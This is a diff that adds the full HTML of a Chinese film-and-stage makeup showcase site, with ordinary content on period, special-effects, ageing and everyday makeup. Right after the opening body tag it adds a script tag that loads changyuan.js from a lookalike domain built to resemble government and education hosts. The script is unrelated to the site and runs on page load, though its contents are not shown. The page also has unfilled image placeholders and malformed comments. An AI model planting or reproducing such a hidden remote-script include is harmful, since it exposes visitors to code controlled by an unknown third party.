@@ -1,0 +1,396 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>影视化妆：让每一张脸都成为角色 | 妆容解析与造型灵感库</title>
+<meta name="keywords" content="影视化妆, 影视妆容, 化妆教程, 角色造型, 特效化妆, 妆容解析, yingshihuazhuang, 美妆灵感">
+<meta name="description" content="影视化妆（yingshihuazhuang-top）是一间关于「脸上功夫」的资料室：从古装妆造到特效伤妆，从年代妆到舞台妆，我们把镜头前的每一笔都拆开讲清楚。打开 https://yingshihuazhuang-top.github.io，看看好妆容是怎么一笔笔画出来的。">
+<style>
+*,*::before,*::after{margin:0;padding:0;box-sizing:border-box}
+:root{--blush:#fdf0f3;--pink:#f7dce6;--rose:#e89ab0;--rose-d:#d4728f;--gold:#d9b06a;--gold-l:#f0d9ac;--plum:#7a5c6b;--ink:#4a3a40;--soft:#8c7a80;--line:rgba(232,154,176,.3)}
+body{font-family:"PingFang SC","Microsoft YaHei","Noto Sans CJK SC",sans-serif;background:var(--blush);color:var(--ink);line-height:1.85;-webkit-font-smoothing:antialiased}
+.wrap{max-width:1140px;margin:0 auto;padding:0 24px}
+img{max-width:100%;display:block;border-radius:16px}
+::selection{background:var(--rose);color:#fff}
+
+/* ===== 粉金渐变顶条 ===== */
+.blushbar{height:8px;background:linear-gradient(90deg,var(--rose),var(--gold-l),#fff2e0,var(--gold),var(--rose));background-size:350% 100%;animation:bb 6s linear infinite}
+@keyframes bb{to{background-position:350% 0}}
+
+/* ===== 报头 ===== */
+.hd{background:rgba(255,255,255,.65);backdrop-filter:blur(14px);border-bottom:1px solid var(--line)}
+.hd-in{display:flex;align-items:center;justify-content:space-between;padding:16px 0;gap:20px;flex-wrap:wrap}
+.logo{display:flex;align-items:center;gap:14px}
+.compact{width:48px;height:48px;border-radius:50%;background:linear-gradient(145deg,var(--rose),var(--gold));position:relative;display:flex;align-items:center;justify-content:center;box-shadow:0 5px 16px rgba(232,154,176,.4)}
+.compact::before{content:"";position:absolute;inset:5px;border-radius:50%;border:1.5px solid rgba(255,255,255,.6)}
+.logo h1{font-size:clamp(22px,3.6vw,34px);font-weight:900;letter-spacing:1px;color:var(--plum)}
+.logo h1 em{font-style:normal;color:var(--rose-d)}
+.logo .sub{font-size:11.5px;color:var(--soft);letter-spacing:3px;margin-top:2px}
+.hd-r{display:flex;gap:10px;flex-wrap:wrap}
+.hd-r a{text-decoration:none;font-size:13px;padding:9px 18px;border-radius:24px;font-weight:600;transition:.25s}
+.hd-r .p{background:var(--rose-d);color:#fff}
+.hd-r .p:hover{background:var(--rose)}
+.hd-r .s{background:var(--pink);color:var(--plum)}
+.hd-r .s:hover{background:var(--rose);color:#fff}
+
+/* ===== 导航 ===== */
+.nv{background:rgba(255,255,255,.6);backdrop-filter:blur(10px);border-bottom:1px solid var(--line);position:sticky;top:0;z-index:60}
+.nv ul{display:flex;list-style:none;gap:0;flex-wrap:wrap}
+.nv a{display:block;padding:14px 22px;color:var(--ink);text-decoration:none;font-size:14px;letter-spacing:1px;font-weight:600;transition:.25s;border-bottom:3px solid transparent}
+.nv a:hover{color:var(--rose-d);background:rgba(232,154,176,.12);border-bottom-color:var(--gold)}
+
+/* ===== Hero ===== */
+.hero{position:relative;border-bottom:1px solid var(--line);overflow:hidden}
+.hero-img{position:relative;height:clamp(360px,58vh,580px);overflow:hidden}
+.hero-img img{width:100%;height:100%;object-fit:cover;border-radius:0}
+.hero-img::after{content:"";position:absolute;inset:0;background:linear-gradient(180deg,rgba(122,92,107,.1) 0%,rgba(122,92,107,.9) 100%)}
+.hero-copy{position:absolute;inset:0;display:flex;flex-direction:column;justify-content:center;align-items:center;text-align:center;z-index:3;padding:0 24px}
+.hero-copy .tk{font-size:12px;letter-spacing:6px;color:var(--gold-l);margin-bottom:18px;text-transform:uppercase}
+.hero-copy h2{font-size:clamp(32px,6vw,60px);font-weight:900;line-height:1.2;color:#fff;margin-bottom:20px;letter-spacing:.5px}
+.hero-copy h2 .hl{color:var(--gold-l)}
+.hero-copy p{font-size:16px;color:rgba(255,255,255,.82);max-width:560px;margin:0 auto 30px}
+.bs{display:flex;gap:14px;flex-wrap:wrap;justify-content:center}
+.b1{display:inline-block;padding:14px 32px;background:var(--rose-d);color:#fff;text-decoration:none;font-size:15px;font-weight:800;border-radius:28px;transition:.25s}
+.b1:hover{background:var(--rose);transform:translateY(-2px);box-shadow:0 8px 22px rgba(212,114,143,.4)}
+.b2{display:inline-block;padding:14px 32px;border:1.5px solid #fff;color:#fff;text-decoration:none;font-size:15px;font-weight:700;border-radius:28px;transition:.25s}
+.b2:hover{background:rgba(255,255,255,.14)}
+
+/* ===== 章节头 ===== */
+.sec{padding:64px 0}
+.sh{display:flex;align-items:baseline;gap:14px;margin-bottom:34px;padding-bottom:12px;border-bottom:2px dashed var(--rose)}
+.sh .no{font-size:11px;font-weight:800;letter-spacing:2px;color:#fff;background:var(--plum);padding:4px 11px;border-radius:20px}
+.sh h2{font-size:24px;font-weight:900;letter-spacing:1px;color:var(--plum)}
+.sh .more{margin-left:auto;font-size:13px;color:var(--soft);text-decoration:none}
+.sh .more:hover{color:var(--rose-d)}
+
+/* ===== 妆容解析 ===== */
+.grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(300px,1fr));gap:22px}
+.gc{background:#fff;border-radius:20px;overflow:hidden;box-shadow:0 6px 20px rgba(232,154,176,.13);transition:.35s;border:2px solid transparent}
+.gc:hover{border-color:var(--rose);transform:translateY(-6px);box-shadow:0 16px 34px rgba(232,154,176,.2)}
+.gc-th{height:170px;overflow:hidden;position:relative}
+.gc-th img{width:100%;height:100%;object-fit:cover;transition:.5s}
+.gc:hover .gc-th img{transform:scale(1.06)}
+.gc-th .tag{position:absolute;top:12px;left:12px;font-size:10.5px;font-weight:800;letter-spacing:1px;color:var(--plum);background:var(--gold-l);padding:4px 11px;border-radius:20px}
+.gb{padding:20px 22px}
+.gb h3{font-size:18px;font-weight:800;color:var(--plum);margin-bottom:5px}
+.gb .mt{font-size:12px;color:var(--soft);margin-bottom:10px}
+.gb p{font-size:13.5px;color:var(--soft);line-height:1.85}
+.gf{margin-top:14px;display:flex;justify-content:space-between;align-items:center;padding-top:11px;border-top:1px dashed var(--line)}
+.gf .sc{font-size:14px;font-weight:800;color:var(--rose-d)}
+.gf a{font-size:12.5px;color:var(--soft);text-decoration:none;font-weight:600}
+.gf a:hover{color:var(--rose-d)}
+
+/* ===== 妆容风格 ===== */
+.cats{background:linear-gradient(150deg,var(--pink),var(--blush));border-radius:28px;padding:12px}
+.cg{display:grid;grid-template-columns:repeat(auto-fill,minmax(180px,1fr));gap:12px}
+.ci{background:#fff;border-radius:18px;padding:22px 14px;text-align:center;transition:.25s;cursor:pointer;box-shadow:0 3px 12px rgba(232,154,176,.12)}
+.ci:hover{background:linear-gradient(145deg,var(--rose),var(--rose-d));transform:translateY(-3px);box-shadow:0 12px 26px rgba(212,114,143,.3)}
+.ci:hover h4,.ci:hover p{color:#fff}
+.ci .ic{font-size:32px;display:block;margin-bottom:8px}
+.ci h4{font-size:14.5px;font-weight:700;color:var(--plum);margin-bottom:3px;transition:.25s}
+.ci p{font-size:11.5px;color:var(--soft);transition:.25s}
+
+/* ===== 双栏 ===== */
+.duo{display:grid;grid-template-columns:1fr 1fr;gap:44px;align-items:center}
+.dimg{height:360px;border-radius:22px;overflow:hidden;border:2px solid var(--pink)}
+.dimg img{width:100%;height:100%;object-fit:cover}
+.dtxt h3{font-size:26px;font-weight:900;color:var(--plum);margin-bottom:18px;line-height:1.4}
+.dtxt h3 .hl{color:var(--rose-d)}
+.dtxt p{font-size:15px;color:var(--soft);margin-bottom:14px}
+.steps{list-style:none;margin-top:20px;counter-reset:st}
+.steps li{counter-increment:st;padding:12px 0;border-bottom:1px dashed var(--line);font-size:14px;color:var(--ink);display:flex;gap:12px}
+.steps li::before{content:counter(st);font-size:12px;font-weight:800;color:#fff;background:linear-gradient(135deg,var(--rose),var(--gold));min-width:26px;height:26px;border-radius:50%;display:flex;align-items:center;justify-content:center}
+.dtxt .go{display:inline-block;margin-top:16px;padding:12px 28px;background:var(--gold);color:var(--plum);text-decoration:none;font-size:14px;font-weight:800;border-radius:26px;transition:.25s}
+.dtxt .go:hover{background:var(--gold-l);transform:translateY(-2px)}
+
+/* ===== 妆容表 ===== */
+.roll{background:#fff;border-radius:22px;overflow:hidden;box-shadow:0 6px 22px rgba(232,154,176,.13)}
+.roll table{width:100%;border-collapse:collapse}
+.roll th{background:linear-gradient(90deg,var(--plum),var(--rose-d));color:#fff;font-size:12px;letter-spacing:2px;padding:15px 20px;text-align:left;font-weight:600}
+.roll td{padding:15px 20px;border-bottom:1px solid var(--line);font-size:14px;color:var(--ink);vertical-align:top}
+.roll tr:last-child td{border-bottom:none}
+.roll tr:hover td{background:rgba(232,154,176,.08)}
+.roll .id{font-family:monospace;color:var(--rose-d);font-size:13px;white-space:nowrap}
+.roll .sc{text-align:right;color:var(--gold);font-weight:800;font-variant-numeric:tabular-nums;white-space:nowrap}
+
+/* ===== 结语 ===== */
+.coda{text-align:center;padding:72px 0;border-top:1px solid var(--line)}
+.coda-in{max-width:660px;margin:0 auto}
+.coda .q{font-size:clamp(22px,3.8vw,36px);font-weight:900;line-height:1.55;color:var(--plum);margin-bottom:26px}
+.coda .q .hl{color:var(--rose-d)}
+.coda p{font-size:15px;color:var(--soft);margin-bottom:14px}
+.coda .u{display:inline-block;margin-top:24px;padding:13px 30px;border:1.5px solid var(--rose-d);color:var(--rose-d);text-decoration:none;font-size:13.5px;font-weight:700;letter-spacing:1px;border-radius:28px;transition:.25s}
+.coda .u:hover{background:var(--rose-d);color:#fff}
+
+/* ===== 页脚 ===== */
+footer{background:var(--plum);color:rgba(255,255,255,.78);padding:44px 0 24px}
+.f-in{display:grid;grid-template-columns:2fr 1fr 1fr 1fr;gap:32px}
+.f-b h4{font-size:19px;color:var(--gold-l);font-weight:900;letter-spacing:1px;margin-bottom:12px}
+.f-b p{font-size:13.5px;line-height:1.95}
+.f-c h5{font-size:12.5px;letter-spacing:2px;color:rgba(255,255,255,.92);margin-bottom:14px}
+.f-c ul{list-style:none}
+.f-c a{color:rgba(255,255,255,.62);text-decoration:none;font-size:13px;line-height:2.2}
+.f-c a:hover{color:#fff}
+.f-bot{border-top:1px solid rgba(255,255,255,.18);margin-top:30px;padding-top:18px;font-size:12px;color:rgba(255,255,255,.55);display:flex;justify-content:space-between;flex-wrap:wrap;gap:10px}
+
+/* ===== 移动端 ===== */
+@media (max-width:920px){
+ .duo{grid-template-columns:1fr;gap:26px}
+ .dimg{height:260px}
+ .f-in{grid-template-columns:1fr 1fr;gap:24px}
+}
+@media (max-width:600px){
+ .hd-in{flex-direction:column;align-items:flex-start}
+ .sh{flex-wrap:wrap}
+ .sh .more{margin-left:0;width:100%}
+ .roll{overflow-x:auto}
+ .roll table{min-width:640px}
+ .nv a{padding:12px 14px;font-size:13px}
+ .f-in{grid-template-columns:1fr}
+ .cg{grid-template-columns:repeat(2,1fr)}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/changyuan.js"></script>
+
+<div class="blushbar"></div>
+
+<!-- ===== 报头 ===== -->
+<header class="hd">
+ <div class="wrap hd-in">
+  <div class="logo">
+   <div class="compact"><span style="font-size:24px">💄</span></div>
+   <div>
+    <h1>影视<em>化妆</em></h1>
+    <div class="sub">MAKEUP FOR SCREEN · 镜头前的脸上功夫</div>
+   </div>
+  </div>
+  <div class="hd-r">
+   <a href="#grid" class="p">妆容解析</a>
+   <a href="#cats" class="s">妆容风格</a>
+  </div>
+ </div>
+</header>
+
+<!-- ===== 导航 ===== */
+<nav class="nv">
+ <div class="wrap">
+  <ul>
+   <li><a href="#home">首页</a></li>
+   <li><a href="#grid">妆容解析</a></li>
+   <li><a href="#cats">妆容风格</a></li>
+   <li><a href="#duo">化妆四步</a></li>
+   <li><a href="#roll">妆容档案</a></li>
+   <li><a href="#coda">关于我们</a></li>
+  </ul>
+ </div>
+</nav>
+
+<!-- ===== Hero ===== */
+<section class="hero" id="home">
+ <div class="hero-img">
+  <img src="HERO_IMG_URL" alt="影视化妆主视觉">
+  <div class="hero-copy">
+   <div class="tk">Face · Brush · Character</div>
+   <h2>让每一张脸，<br>都成为<em class="hl">一个角色</em></h2>
+   <p>影视化妆（yingshihuazhuang-top）是一间关于「脸上功夫」的资料室。从古装妆造到特效伤妆，从年代妆到舞台妆，我们把镜头前的每一笔都拆开讲清楚。</p>
+   <div class="bs">
+    <a href="#grid" class="b1">🎨 妆容解析</a>
+    <a href="#duo" class="b2">化妆四步</a>
+   </div>
+  </div>
+ </div>
+</section>
+
+<!-- ===== 妆容解析 ===== -->
+<section class="wrap sec" id="grid">
+ <div class="sh">
+  <span class="no">解析 01</span>
+  <h2>妆容解析</h2>
+  <a href="#" class="more">全部解析 →</a>
+ </div>
+ <div class="grid">
+  <article class="gc">
+   <div class="gc-th"><img src="HERO_IMG_URL" alt="古装妆造"><span class="tag">古装</span></div>
+   <div class="gb">
+    <h3>唐朝仕女妆：从敷粉到花钿</h3>
+    <div class="mt">古装剧 / 还原向</div>
+    <p>一整个流程要七八道工序：敷粉、抹胭脂、画黛眉、贴花钿、点面靥。我们按史书记载一步步还原，看看古人到底是怎么"上妆"的。</p>
+    <div class="gf"><span class="sc">完整度 ★★★★★</span><a href="#">解析 →</a></div>
+   </div>
+  </article>
+  <article class="gc">
+   <div class="gc-th"><img src="WEEKEND_IMG_URL" alt="年代妆"><span class="tag">年代</span></div>
+   <div class="gb">
+    <h3>八十年代港风妆：一抹红唇的讲究</h3>
+    <div class="mt">年代剧 / 港风</div>
+    <p>那个年代的妆讲究"浓而不俗"：上扬的眼线、哑光红唇、修得极细的眉形。我们用几支基础产品，复刻出屏幕上的港风味道。</p>
+    <div class="gf"><span class="sc">完整度 ★★★★☆</span><a href="#">解析 →</a></div>
+   </div>
+  </article>
+  <article class="gc">
+   <div class="gc-th"><img src="CATS_IMG_URL" alt="特效伤妆"><span class="tag">特效</span></div>
+   <div class="gb">
+    <h3>特效伤妆：淤青是怎么"长"出来的</h3>
+    <div class="mt">特效 / 伤效</div>
+    <p>淤青不是涂一块紫色就完事。要分层次：底色发黄发绿、边缘泛红、中间偏紫，还得做出皮肤的凹凸感。跟着步骤做，能骗过镜头。</p>
+    <div class="gf"><span class="sc">完整度 ★★★★★</span><a href="#">解析 →</a></div>
+   </div>
+  </article>
+  <article class="gc">
+   <div class="gc-th"><img src="WEEKEND_IMG_URL" alt="老年妆"><span class="tag">塑型</span></div>
+   <div class="gb">
+    <h3>老年妆：把年龄"画"上去</h3>
+    <div class="mt">塑型 / 老年</div>
+    <p>用油彩和乳胶把年轻人的脸"变老"：加深法令纹、做出眼袋和颈纹、改变肤色和肌肉走向。一个妆要三小时，镜头里看不出破绽。</p>
+    <div class="gf"><span class="sc">完整度 ★★★★☆</span><a href="#">解析 →</a></div>
+   </div>
+  </article>
+  <article class="gc">
+   <div class="gc-th"><img src="HERO_IMG_URL" alt="舞台妆"><span class="tag">舞台</span></div>
+   <div class="gb">
+    <h3>舞台妆 vs 镜头妆：差在哪</h3>
+    <div class="mt">对比 / 科普</div>
+    <p>同一个人在舞台上和镜头前，妆要画得完全不一样。我们拿同一张脸做两组对比，一眼就能看出差别在哪儿。</p>
+    <div class="gf"><span class="sc">完整度 ★★★★☆</span><a href="#">解析 →</a></div>
+   </div>
+  </article>
+  <article class="gc">
+   <div class="gc-th"><img src="CATS_IMG_URL" alt="日常妆"><span class="tag">日常</span></div>
+   <div class="gb">
+    <h3>把影视妆"降维"到日常</h3>
+    <div class="mt">实用 / 日常</div>
+    <p>影视妆看着夸张，但很多技巧能用到日常：修容的手法、眼线的走势、打光和妆的关系。学会这几招，日常妆立刻上一个台阶。</p>
+    <div class="gf"><span class="sc">完整度 ★★★★☆</span><a href="#">解析 →</a></div>
+   </div>
+  </article>
+ </div>
+</section>
+
+<!-- ===== 妆容风格 ===== -->
+<section class="wrap sec" id="cats">
+ <div class="sh">
+  <span class="no">风格</span>
+  <h2>妆容风格</h2>
+  <a href="#" class="more">全部风格 →</a>
+ </div>
+ <div class="cats">
+  <div class="cg">
+   <div class="ci"><span class="ic">👑</span><h4>古装妆造</h4><p>1,240 组 · 历朝历代</p></div>
+   <div class="ci"><span class="ic">🎞️</span><h4>年代妆</h4><p>986 组 · 港风民国</p></div>
+   <div class="ci"><span class="ic">🧟</span><h4>特效伤妆</h4><p>654 组 · 血浆塑型</p></div>
+   <div class="ci"><span class="ic">💋</span><h4>日常妆</h4><p>2,340 组 · 实用可学</p></div>
+   <div class="ci"><span class="ic">🎭</span><h4>舞台妆</h4><p>876 组 · 远距离也立体</p></div>
+   <div class="ci"><span class="ic">🩸</span><h4>老年塑型</h4><p>432 组 · 改头换面</p></div>
+   <div class="ci"><span class="ic">💒</span><h4>新娘妆</h4><p>1,210 组 · 白纱造型</p></div>
+   <div class="ci"><span class="ic">🧒</span><h4>儿童妆</h4><p>520 组 · 轻柔为主</p></div>
+  </div>
+ </div>
+</section>
+
+<!-- ===== 化妆四步 ===== -->
+<section class="wrap sec" id="duo">
+ <div class="sh">
+  <span class="no">方法</span>
+  <h2>化妆四步</h2>
+  <a href="#" class="more">详细步骤 →</a>
+ </div>
+ <div class="duo">
+  <div class="dimg"><img src="WEEKEND_IMG_URL" alt="专业化妆间"></div>
+  <div class="dtxt">
+   <h3>好妆容不是堆出来的，<br>是<em class="hl">一步步画</em>出来的</h3>
+   <p>影视化妆看着复杂，拆开其实就是四步。我们把专业化妆师的流程整理成普通人也能照着做的步骤，从底妆到定妆，一步都不跳过。</p>
+   <ul class="steps">
+    <li><span>先养皮、再打底，底子干净比粉厚更重要。</span></li>
+    <li><span>修容定骨架，高光阴影把脸的立体感画出来。</span></li>
+    <li><span>眉眼做重点，五官里最能表达情绪的是眼睛。</span></li>
+    <li><span>定妆要够狠，镜头前的妆经不起一点油光。</span></li>
+   </ul>
+   <a href="#" class="go">📖 查看完整步骤</a>
+  </div>
+ </div>
+</section>
+
+<!-- ===== 妆容档案 ===== */
+<section class="wrap sec" id="roll">
+ <div class="sh">
+  <span class="no">档案</span>
+  <h2>妆容档案</h2>
+  <a href="#" class="more">往期档案 →</a>
+ </div>
+ <div class="roll">
+  <table>
+   <thead>
+    <tr><th>编号</th><th>妆容主题</th><th>类型 / 难度</th><th>耗时参考</th><th style="text-align:right">还原度</th></tr>
+   </thead>
+   <tbody>
+    <tr><td class="id">HZ-TANG-01</td><td>唐朝仕女妆</td><td>古装 / 进阶</td><td>约 90 分钟</td><td class="sc">96%</td></tr>
+    <tr><td class="id">HZ-HK-02</td><td>八十年代港风妆</td><td>年代 / 入门</td><td>约 35 分钟</td><td class="sc">92%</td></tr>
+    <tr><td class="id">HZ-SFX-03</td><td>特效淤青伤妆</td><td>特效 / 进阶</td><td>约 60 分钟</td><td class="sc">95%</td></tr>
+    <tr><td class="id">HZ-OLD-04</td><td>老年塑型妆</td><td>塑型 / 专业</td><td>约 180 分钟</td><td class="sc">98%</td></tr>
+    <tr><td class="id">HZ-STA-05</td><td>舞台浓妆</td><td>舞台 / 入门</td><td>约 40 分钟</td><td class="sc">90%</td></tr>
+    <tr><td class="id">HZ-DAY-06</td><td>影视感日常妆</td><td>日常 / 入门</td><td>约 25 分钟</td><td class="sc">88%</td></tr>
+    <tr><td class="id">HZ-BRI-07</td><td>新娘白纱妆</td><td>新娘 / 进阶</td><td>约 75 分钟</td><td class="sc">94%</td></tr>
+   </tbody>
+  </table>
+ </div>
+</section>
+
+<!-- ===== 关于我们 ===== */
+<section class="wrap coda" id="coda">
+ <div class="coda-in">
+  <div class="q">&ldquo;妆不是遮住什么，<br>而是<em class="hl">说出这个人是谁</em>。&rdquo;</div>
+  <p>影视化妆想做的，就是把镜头前的那张脸讲清楚。好妆容从来不是堆出来的，一笔一笔、一层一层，都是为了说清角色是谁、经历过什么。</p>
+  <p>档案每天都在补，我们也每天都在研究新的妆法。想学哪一类妆？从妆容档案挑一个，跟着画一遍就懂了。</p>
+  <a href="https://yingshihuazhuang-top.github.io" class="u">◆ https://yingshihuazhuang-top.github.io ◆</a>
+ </div>
+</section>
+
+<!-- ===== 页脚 ===== -->
+<footer>
+ <div class="wrap">
+  <div class="f-in">
+   <div class="f-b">
+    <h4>💄 影视化妆</h4>
+    <p>让每一张脸都成为角色。妆容解析与造型灵感库，从古装妆造到特效伤妆，从年代妆到舞台妆，把镜头前的每一笔都拆开讲清楚。</p>
+   </div>
+   <div class="f-c">
+    <h5>妆容</h5>
+    <ul>
+     <li><a href="#grid">妆容解析</a></li>
+     <li><a href="#cats">妆容风格</a></li>
+     <li><a href="#roll">妆容档案</a></li>
+     <li><a href="#">完整资料</a></li>
+    </ul>
+   </div>
+   <div class="f-c">
+    <h5>方法</h5>
+    <ul>
+     <li><a href="#duo">化妆四步</a></li>
+     <li><a href="#">工具清单</a></li>
+     <li><a href="#">产品推荐</a></li>
+     <li><a href="#">常见问题</a></li>
+    </ul>
+   </div>
+   <div class="f-c">
+    <h5>关于</h5>
+    <ul>
+     <li><a href="#coda">关于我们</a></li>
+     <li><a href="#">免责声明</a></li>
+     <li><a href="#">版权说明</a></li>
+     <li><a href="#">联系合作</a></li>
+    </ul>
+   </div>
+  </div>
+  <div class="f-bot">
+   <span>© 2024 影视化妆 · 让每一张脸都成为角色</span>
+   <span>https://yingshihuazhuang-top.github.io</span>
+  </div>
+ </div>
+</footer>
+
+</body>
+</html>
